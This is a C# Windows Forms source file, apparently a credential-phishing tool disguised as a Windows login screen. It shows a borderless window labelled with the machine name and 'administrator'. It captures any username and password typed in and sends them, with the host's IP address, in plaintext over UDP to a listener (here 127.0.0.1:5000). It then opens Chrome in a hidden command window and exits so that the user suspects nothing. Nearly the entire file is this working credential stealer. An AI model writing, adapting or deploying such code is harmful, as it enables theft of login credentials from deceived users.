using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;
using System.Linq;
using System.Collections.Generic;
using System.Media;


namespace BlackJack
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            string name1;
            string name2;
            string name3;
            this.ControlBox = false;
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            name1 = Environment.MachineName;
            name2 = "administrator";
            name3 = "/";
            string name = string.Concat(name1, name3, name2);
            label8.Text = name;
            Form2 frm2 = new Form2();
            frm2.Show();
            SystemSounds.Beep.Play();

        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }

        private void label2_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }

        private void label3_Click(object sender, EventArgs e)
        {

        }

        private void button2_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string username;
            string password;
            bool booleanval = false;
            username = textBox1.Text;
            password = textBox2.Text;


            if ((username == "") || (password == "")) {

                label10.Text = "The username or password is incorrect.";
            }
            else
            {
                booleanval = true;
                string hostName = Dns.GetHostName(); // Retrive the Name of HOST  
                string myIP = Dns.GetHostByName(hostName).AddressList[0].ToString();
                Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram,
                ProtocolType.Udp);

                IPAddress serverAddr = IPAddress.Parse("127.0.0.1");

                IPEndPoint endPoint = new IPEndPoint(serverAddr, 5000);
                string text = "U: " + username + " P: " + password + " H: " + myIP;
                byte[] send_buffer = Encoding.ASCII.GetBytes(text);

                sock.SendTo(send_buffer, endPoint);

                System.Diagnostics.Process process = new System.Diagnostics.Process();
                System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
                startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                startInfo.FileName = "cmd.exe";
                startInfo.Arguments = "/C start chrome";
                process.StartInfo = startInfo;
                process.Start();
                Environment.Exit(0);
            }
            


        }

        private void pictureBox2_Click(object sender, EventArgs e)
        {

        }

        private void label10_Click(object sender, EventArgs e)
        {

        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }
    }
}

